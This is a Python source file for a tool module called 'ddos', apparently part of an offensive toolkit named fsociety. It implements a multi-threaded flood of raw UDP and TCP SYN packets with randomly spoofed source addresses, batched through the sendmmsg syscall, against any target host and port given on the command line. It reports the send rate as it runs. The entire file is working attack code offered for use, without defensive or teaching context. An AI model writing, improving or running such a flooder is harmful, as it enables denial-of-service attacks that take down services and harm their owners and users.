from __future__ import annotations
import ctypes
import os
import random
import socket
import struct
import threading
import time

from fsociety.core.base import tool
from fsociety.core.logger import Log

SYS_SENDMMSG = 307

class Mmsghdr(ctypes.Structure):
    _fields_ = [("msg_hdr", ctypes.c_byte * 56), ("msg_len", ctypes.c_uint32)]

@tool("ddos", "Extreme batched multi-vector flood (UDP/SYN)", category="dos")
class Ddos:
    @staticmethod
    def build_parser(p):
        p.add_argument("target")
        p.add_argument("port", type=int)
        p.add_argument("--mode", default="udp", choices=["udp", "syn", "all"])
        p.add_argument("--threads", type=int, default=8)
        p.add_argument("--duration", type=int, default=60)
        p.add_argument("--batch", type=int, default=1024)
        p.add_argument("--size", type=int, default=1400)

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def _build_udp(target: str, port: int, size: int) -> bytes:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        sport = random.randint(1024, 65535)
        payload = os.urandom(size)
        udp = struct.pack("!HHHH", sport, port, 8 + size, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(target) + struct.pack("!BBH", 0, 17, 8 + size)
        udp = struct.pack("!HHHH", sport, port, 8 + size, Ddos._checksum(pseudo + udp + payload))
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + size, random.randint(0, 65535), 0, 64, 17, 0,
                         socket.inet_aton(src_ip), socket.inet_aton(target))
        return ip[:10] + struct.pack("!H", Ddos._checksum(ip)) + ip[12:] + udp + payload

    @staticmethod
    def _build_syn(target: str, port: int) -> bytes:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        sport = random.randint(1024, 65535)
        tcp = struct.pack("!HHLLBBHHH", sport, port, random.randint(0, 0xffffffff), 0,
                          5 << 4, 0x02, 8192, 0, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(target) + struct.pack("!BBH", 0, 6, len(tcp))
        tcp = tcp[:16] + struct.pack("!H", Ddos._checksum(pseudo + tcp)) + tcp[18:]
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0,
                         socket.inet_aton(src_ip), socket.inet_aton(target))
        return ip[:10] + struct.pack("!H", Ddos._checksum(ip)) + ip[12:] + tcp

    @staticmethod
    def _sender(target: str, port: int, mode: str, size: int, batch_size: int,
                stop_event: threading.Event, stats: dict, lock: threading.Lock):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            return

        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        sockaddr = struct.pack("!HH4s8x", socket.AF_INET, 0, socket.inet_aton(target))
        msgs = (Mmsghdr * batch_size)()
        keep_alive = []
        sent = 0
        start = time.time()

        while not stop_event.is_set():
            for i in range(batch_size):
                if mode == "syn":
                    p = Ddos._build_syn(target, port)
                elif mode == "udp":
                    p = Ddos._build_udp(target, port, size)
                else:
                    p = Ddos._build_syn(target, port) if random.random() > 0.5 else Ddos._build_udp(target, port, size)

                buf = ctypes.create_string_buffer(p)
                iov = (ctypes.c_byte * 16)()
                ctypes.memmove(iov, struct.pack("Q", ctypes.addressof(buf)), 8)
                ctypes.memmove(ctypes.addressof(iov) + 8, struct.pack("Q", len(p)), 8)
                sa_buf = ctypes.create_string_buffer(sockaddr)
                hdr = msgs[i].msg_hdr
                ctypes.memmove(ctypes.addressof(hdr) + 0, struct.pack("Q", ctypes.addressof(sa_buf)), 8)
                ctypes.memmove(ctypes.addressof(hdr) + 8, struct.pack("I", 16), 4)
                ctypes.memmove(ctypes.addressof(hdr) + 16, struct.pack("Q", ctypes.addressof(iov)), 8)
                ctypes.memmove(ctypes.addressof(hdr) + 24, struct.pack("Q", 1), 8)
                msgs[i].msg_len = len(p)
                keep_alive.append((buf, iov, sa_buf))

            try:
                libc.syscall(SYS_SENDMMSG, s.fileno(), ctypes.byref(msgs), batch_size, 0)
                sent += batch_size
            except Exception:
                pass

            with lock:
                stats["sent"] = stats.get("sent", 0) + sent
            sent = 0

        s.close()

    @staticmethod
    def run(args, log: Log) -> int:
        if os.geteuid() != 0:
            log.err("Raw sockets require root. Run: sudo python3 r3con.py")
            return 1

        try:
            target = socket.gethostbyname(args.target)
        except socket.gaierror:
            target = args.target

        log.info(f"Target: {target}:{args.port} | Mode: {args.mode.upper()} | Batch: {args.batch}")
        stop_event = threading.Event()
        stats = {}
        lock = threading.Lock()
        threads = []

        for _ in range(args.threads):
            t = threading.Thread(target=Ddos._sender,
                                 args=(target, args.port, args.mode, args.size, args.batch, stop_event, stats, lock),
                                 daemon=True)
            t.start()
            threads.append(t)

        start = time.time()
        last = 0
        try:
            while time.time() - start < args.duration:
                time.sleep(2)
                with lock:
                    cur = stats.get("sent", 0)
                pps = (cur - last) / 2
                last = cur
                log.info(f"elapsed {int(time.time()-start)}s | total {cur:,} | pps {pps:,.0f}")
        except KeyboardInterrupt:
            pass

        stop_event.set()
        for t in threads:
            t.join(timeout=1)
        log.ok(f"Flood halted. Total sent: {stats.get('sent', 0):,}")
        return 0
